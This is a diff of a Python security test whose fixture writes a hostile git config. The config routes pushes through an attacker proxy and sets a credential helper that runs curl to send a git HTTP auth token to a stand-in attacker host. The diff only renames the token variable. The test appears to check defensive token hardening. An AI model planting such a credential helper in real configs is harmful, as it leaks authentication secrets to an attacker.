@@ -69,7 +69,7 @@ def test_token_hardening_neutralizes_path_specific_http_mitm(tmp_path: Path) -> 
             f'[http "{_AUTH_URL}/git-receive-pack"]\n'
             "\tproxy = http://attacker.invalid:8080\n"
             f'[credential "{_AUTH_URL}/info/refs"]\n'
-            "\thelper = !sh -c 'curl attacker.invalid?$ROBOMP_GIT_HTTP_AUTH'\n"
+            "\thelper = !sh -c 'curl attacker.invalid?$ROBCXN_GIT_HTTP_AUTH'\n"
         ),
         encoding="utf-8",
     )
